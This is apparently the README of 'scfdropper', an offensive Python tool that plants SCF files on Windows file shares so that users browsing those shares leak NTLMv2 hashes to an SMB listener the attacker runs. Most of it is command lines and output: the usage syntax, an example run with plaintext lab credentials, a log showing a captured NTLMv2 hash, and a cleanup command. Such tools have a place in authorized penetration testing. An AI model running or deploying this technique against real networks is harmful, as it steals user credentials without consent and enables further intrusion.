# scfdropper
Drops SCFs onto file shares so you can grab NTLMv2 hashes in return.

# Help Menu:
```
./scfdropper.py -h
usage: scfdropper.py [-h] -ip IPADDRESS -u USER -p PWD -d DOMAIN [-t THREADS]
                     -s SHARE [-f SUBFOLDER] [-o OUTFILE]

SMB Spider for PS1 Scripts

optional arguments:
  -h, --help            show this help message and exit
  -ip IPADDRESS, --ipaddress IPADDRESS
                        Target IP
  -u USER, --user USER  user
  -p PWD, --pwd PWD     password
  -d DOMAIN, --domain DOMAIN
                        domain
  -t THREADS, --threads THREADS
                        number of threads
  -s SHARE, --share SHARE
                        SMB Share
  -f SUBFOLDER, --subfolder SUBFOLDER
                        SMB Subfolder to drop SCF file onto.
  -o OUTFILE, --outfile OUTFILE
                        Outfile to log hashes
```

# Example Usage:
```
./scfdropper.py -ip 192.168.204.132 -u testuser3 -p Summer2019 -d TGORE -s SharedFolder -f things
[+] Connection to 192.168.204.132 Successful! Dropping SCF's Now!
[*] Uploading file to: \\192.168.204.136\SharedFolder\things\swag.scf
[+] Done Dropping SCF's...  Launching SMBServer To Catch Creds...

10/30/2019 09:31:10 AM: INFO: Config file parsed
10/30/2019 09:31:11 AM: INFO: Incoming connection (192.168.204.135,22562)
10/30/2019 09:31:11 AM: INFO: AUTHENTICATE_MESSAGE (TGORE\testuser2,EXCHANGE)
10/30/2019 09:31:11 AM: INFO: User EXCHANGE\testuser2 authenticated successfully
10/30/2019 09:31:11 AM: INFO: testuser2::TGORE:4141414141414141:79c0a7ce827112ac85b46467797279e6:01010000000000008061f0ac2e8fd5019ba5b0cf4e110d410000000001001000550070006c0056006f0045004e006c00020010004f006d0078006d007a006a0050004f0003001000550070006c0056006f0045004e006c00040010004f006d0078006d007a006a0050004f00070008008061f0ac2e8fd50106000400020000000800300030000000000000000000000000200000e6063cf85f7bde7f8d331a20344807a5ca3bf084434cf308beeb59a740afbd480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200300034002e00310033003600000000000000000000000000
10/30/2019 09:31:11 AM: INFO: Connecting Share(1:share)
10/30/2019 09:31:27 AM: INFO: Disconnecting Share(1:share)
10/30/2019 09:31:27 AM: INFO: Handle: [Errno 104] Connection reset by peer
10/30/2019 09:31:27 AM: INFO: Closing down connection (192.168.204.135,22562)
10/30/2019 09:31:27 AM: INFO: Remaining connections []

```
# Clean up your dropped SCF files
```
./scfdropper.py -ip 192.168.204.132 -u testuser3 -p Summer2019 -d TGORE -s SharedFolder -f things --cleanup
[+] Connection to 192.168.204.132 Successful! Cleaning up SCF's Now!
[*] Attempting to delete the following file: \\192.168.204.132\SharedFolder\swag.scf
[+] File has been deleted.

```
